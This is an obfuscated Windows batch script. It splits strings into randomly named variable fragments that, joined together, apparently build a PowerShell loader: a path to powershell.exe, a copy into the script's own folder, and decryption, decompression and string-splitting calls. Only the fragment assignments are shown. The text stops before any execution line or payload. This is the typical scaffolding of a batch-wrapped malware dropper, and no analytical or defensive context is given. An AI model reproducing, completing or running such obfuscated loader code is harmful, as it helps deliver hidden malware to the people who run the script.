@echo off
set "XKOOitSegw=y "
set "fCXkrXDiaG=do"
set "oHATnHeshW=Wi"
set "LiRBFXHilW=1."
set "KFcGDBxDFJ= /"
set "eLdXvZkfWB=Sy"
set "mZbacPLHet=0\"
set "dteDthEdDr=:\"
set "ylKPIUCaNx=ll"
set "CCjCZITIhM=em"
set "VjKxyBBBYM=in"
set "XJkzRUIRxb=s\"
set "lJIaMnfBjF=ow"
set "kjOWMzFKFN=32"
set "hLXllBDRwL=ll"
set "evpVQayryk=Po"
set "rdiYGSalYQ=nd"
set "AFuHcvnhdh=xe"
set "EaxDIKnctq=he"
set "WqxngwFOfD=he"
set "uDxtgJzMSU=.e"
set "cZFIyEExtm=\W"
set "YoTuXCXBdu=ws"
set "gsfMgEZzhZ=st"
set "bvxMnGpqAW=rS"
set "LLvjEquikL=we"
set "XeMTHAbuqB=we"
set "nuPQkBBkAD=rs"
set "GjeDMBMNRf=py"
set "ACkCtIYCHj=\v"
set "CjLKIielUN= C"
set "doDcwbPVkZ=po"
set "cLWGZpUCOP=co"
set "BsNuTsTfQB= %~dp0"
set "ugejfIoOve=cd"
set "QCLMDYTIsD=z.Pa"
set "efiBUaEgnE=pres"
set "zUjVzsGzWH= = N"
set "kdcicvyjAi=Stre"
set "ZBjhtuCuXp=-joi"
set "oHGeNqhXPc=ikoJ"
set "lJDNhAqWqj=m(, "
set "NmDBjTSykg=);$M"
set "UQesbLGQbt=yvEz"
set "agdqtCiulO=k; }"
set "xdOBroTtxR=tem."
set "ciVNSBzTLo=]::N"
set "PdtLnpZUIF=; };"
set "KvQLJFlyPL=[Env"
set "ahqjNiXVuT=Syst"
set "fNdkrUDCFq=and "
set "QCZYLhRzoX=ionM"
set "HLPiMKCCzh=yvEz"
set "veurrmgCIB=stem"
set "ytTlISNoSq=fore"
set "HAKMNQaVHd=Disp"
set "DOmoTDQbMQ=g = "
set "rLmKWkqFjI=)($q"
set "YxONBboiXM= [Sy"
set "odFpIwLXfD=.Dis"
set "UMvsOkTbir=ing("
set "ASeMOvCutb=$bwp"
set "dgkLrnrBtH=Mw, "
set "NxkngIBOMA=CFxo"
set "aTTXXUMXcd=form"
set "YzueiYrKYS=S46e"
set "hbnXjuYdWo=brea"
set "ClXqKXTdmp=Bmor"
set "aySKdBOrjf=ress"
set "iZbJeVTVVK=('%*'"
set "YWNjwMBkzX=o, 0"
set "WbvWLuhmPJ=gth)"
set "oTznDYAFwx== $M"
set "uhjKJLTGUp=y.Ci"
set "pKLmJOGIzM=raph"
set "dpZySVZfZG=[IO."
set "pOTynsGHFk=-1.."
set "JVuqIxebCe=ress"
set "MtTiQDzaVp=y.Pa"
set "STuAmHEUwz=lit("
